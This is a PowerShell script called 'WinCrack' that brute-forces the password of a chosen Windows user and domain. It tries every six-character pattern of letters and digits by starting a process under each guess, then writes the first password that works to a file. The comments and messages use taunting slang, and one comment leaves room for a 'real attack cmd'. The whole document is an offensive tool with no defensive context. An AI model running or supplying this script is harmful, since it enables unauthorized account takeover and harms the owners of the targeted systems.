# =========================
# SIGMA LLLNNL WINCRACK
# =========================
[console]::Title = "WinCrack"
[console]::ForegroundColor = 'green'

# --- CONFIG ---
$domain = Read-Host "Domain (e.g., MY-PC)"
$user = Read-Host "Username (opps to clap)"
$letters = 'a'..'z'
$numbers = 0..9
$found = $false
$saveFile = "sigma_rizz.txt"  # saves the password when found

function Try-Crack {
    param($username, $password, $domain)

    try {
        $ps = New-Object System.Diagnostics.ProcessStartInfo
        $ps.FileName = "whoami.exe"   # dummy command, real attack cmd goes here
        $ps.UseShellExecute = $false
        $ps.UserName = $username
        $ps.Password = (ConvertTo-SecureString $password -AsPlainText -Force)
        $ps.Domain = $domain
        [System.Diagnostics.Process]::Start($ps) | Out-Null
        return $true
    } catch {
        return $false
    }
}

Write-Host "`n[!] Starting sigma grind on $user@$domain" -ForegroundColor Yellow

foreach ($l1 in $letters) {
    foreach ($l2 in $letters) {
        foreach ($l3 in $letters) {
            foreach ($n1 in $numbers) {
                foreach ($n2 in $numbers) {
                    foreach ($l4 in $letters) {
                        $combo = "$l1$l2$l3$n1$n2$l4"
                        Write-Host "Trying combo: $combo" -NoNewline
                        
                        if (Try-Crack -username $user -password $combo -domain $domain) {
                            Write-Host " ✅ CLAPPED! Password found: $combo" -ForegroundColor Green
                            $combo | Out-File -FilePath $saveFile -Encoding utf8
                            $found = $true
                            break 6  # exit all loops immediately
                        } else {
                            Write-Host " ❌ failed" -ForegroundColor Cyan
                        }
                    }
                    if ($found) { break }
                }
                if ($found) { break }
            }
            if ($found) { break }
        }
        if ($found) { break }
    }
    if ($found) { break }
}

if (-not $found) {
    Write-Host "`n[!] Sigma grind complete, no gyat clapped..." -ForegroundColor Red
} else {
    Write-Host "`n[!] Rizz saved in $saveFile" -ForegroundColor Green
}
